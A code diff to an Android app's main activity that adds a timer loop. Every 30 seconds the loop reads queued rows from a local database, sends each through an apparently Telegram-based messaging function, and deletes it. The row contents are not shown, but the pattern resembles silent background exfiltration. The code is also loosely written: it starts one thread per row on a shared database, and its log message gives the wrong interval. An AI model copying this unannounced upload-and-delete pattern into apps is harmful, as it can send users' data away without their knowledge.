@@ -11,11 +11,12 @@ import android.content.ContentUris
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
-import android.media.MediaPlayer
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
+import android.os.Handler
+import android.os.Looper
 import android.provider.DocumentsContract
 import android.provider.MediaStore
 import android.provider.Settings
@@ -35,8 +36,9 @@ import androidx.navigation.ui.AppBarConfiguration
 import com.aaapkg.databinding.ActivityMainBinding
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
-import kotlinx.coroutines.withContext
 import kotlinx.serialization.Serializable
+import lib.sendMsgTg
+import lib.sendMsgTgRetry
 import java.io.File
 import java.io.FileOutputStream
 import java.io.IOException
@@ -58,13 +60,42 @@ class MainActivity : AppCompatActivity() {
     val pmscode_MANAGE_EXTERNAL_STORAGE = 894
     val REQUEST_CODE_SELECT_DIRECTORY = 895
     val REQUEST_CODE_SELECT_Fil = 896
-    override fun onCreate(savedInstanceState: Bundle?) {
 
+
+    private val handler = Handler(Looper.getMainLooper())
+    private val runnableTaskTimer = object : Runnable {
+        override fun run() {
+            Log.d(tagLog, "定时器触发：7 秒")
+
+            val dbHelper = UtilDbSqltV2(appContext, "dbIm2025")
+            val db = dbHelper.writableDatabase
+            var lst = getAllrowsV2(db);//List<KVrow>
+            lst.forEachIndexed { index, msg ->
+
+                Thread {
+
+                    sendMsgTgRetry(msg.v);
+                    del_row(msg.k, db)
+                }.start()
+
+
+            }
+
+            handler.postDelayed(this, 30*1000) // 继续执行
+        }
+    }
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        appContext = applicationContext
+        AppCompatActivity1main = this
+
+        // 启动定时任务
+        handler.postDelayed(runnableTaskTimer, 0)
 
         try {
             val dbHelper = UtilDbSqltV2(this, "dbIm2025")
             val db = dbHelper.writableDatabase
-            write_rowV2("1", "1txt",   db);
+            write_rowV2("1", "1txt", db);
 
             var lst11 = getAllrowsV2(db);
             println(11)
@@ -74,8 +105,7 @@ class MainActivity : AppCompatActivity() {
         }
 
 
-        appContext = applicationContext
-        AppCompatActivity1main = this
+
 
         try {
             Log.d(tagLog, "funx onCrt()")
